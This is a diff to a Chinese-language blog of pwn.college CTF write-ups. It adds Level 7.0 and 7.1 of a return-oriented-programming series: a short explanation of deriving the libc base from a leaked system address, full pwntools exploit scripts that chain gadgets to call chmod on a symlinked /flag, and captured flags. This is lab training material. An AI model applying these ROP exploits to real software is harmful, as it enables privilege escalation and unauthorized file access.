@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-20 17:00"
+modDate: "2025-01-20 18:54"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -915,6 +915,8 @@ Flag: `pwn.college{o7dF6gbwKmwO-Xrdr1WGG5iKIQ-.0lN0MDL5cTNxgzW}`
 
 说实话我感觉自己可能跑偏了，据说这题可以自己构造字符串，但是我太笨了没想出来怎么 leak stack……但是，你就说我这个方法是不是更简单吧 LMAO
 
+> 刚打完 Level 7 的我敏锐的注意到了什么……既然 Level 7 是直接输出地址，那么……靠，Level 4 果然是把栈地址直接告诉我们了，但因为我没关注程序输出，so……好吧我本以为有什么神奇的构造字符串方法，那没事了，又结了一桩心头大患……
+
 我日，为什么今天都 1.20 了，寒假过的真快，结束前能不能打完 FmtStr 都不好说了……
 
 ### Exploit
@@ -1751,3 +1753,293 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{A-DtWrNucuvlqiQOl-yB1ARFcxt.0lM1MDL5cTNxgzW}`
+
+## Level 7.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Utilize a libc leak to ROP with libc!
+
+### Write-up
+
+利用已经泄漏的 `system` 的地址减去 `system` 在 `libc` 中的偏移得到 `libc` 的基地址，然后通过 `libc` 基地址加上 `chmod` 在 `libc` 中的偏移就可以得到 `chmod` 的实际地址了。简简单单，都不需要想办法怎么泄漏地址，程序直接通过 `dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "system");` 把地址告诉我们了……
+
+哎不对，难道说 [Level 4](#level-40)……
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level7.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *challenge+380
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+    padding_to_ret = b"".ljust(0x58, b"A")
+
+    libc_base = leaked_addr - libc.symbols["system"]
+    chmod = libc_base + libc.symbols["chmod"]
+
+    filename = next(elf.search(b"GNU"))
+    mode = 0o4
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_pop_r15_ret),
+        p64(mode),
+        b"".ljust(0x8, b"A"),
+        p64(chmod),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b'"system" in libc is: ')
+
+    return int(target.recv(14), 16)
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag GNU")
+
+        send_payload(target, payload)
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as file:
+                content = file.read()
+                log.success(content)
+
+                return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload(leak(target))
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+### Flag
+
+Flag: `pwn.college{USImSejN9YmHN5CcyKDwtVScMO7.01M1MDL5cTNxgzW}`
+
+## Level 7.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Utilize a libc leak to ROP with libc!
+
+### Write-up
+
+参见 [Level 7.0](#level-70)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level7.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+    padding_to_ret = b"".ljust(0x48, b"A")
+
+    libc_base = leaked_addr - libc.symbols["system"]
+    chmod = libc_base + libc.symbols["chmod"]
+
+    filename = next(elf.search(b"GNU"))
+    mode = 0o4
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_pop_r15_ret),
+        p64(mode),
+        b"".ljust(0x8, b"A"),
+        p64(chmod),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b'"system" in libc is: ')
+
+    return int(target.recv(14), 16)
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag GNU")
+
+        send_payload(target, payload)
+
+        target.recvall(timeout=3)
+
+        try:
+            with open("/flag", "r") as file:
+                content = file.read()
+                log.success(content)
+
+                return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+        except Exception as e:
+            log.exception(f"An error occurred while performing attack: {e}")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload(leak(target))
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{g7Ura4DbaSnnNgm8JQPQ2XM6c_l.0FN1MDL5cTNxgzW}`
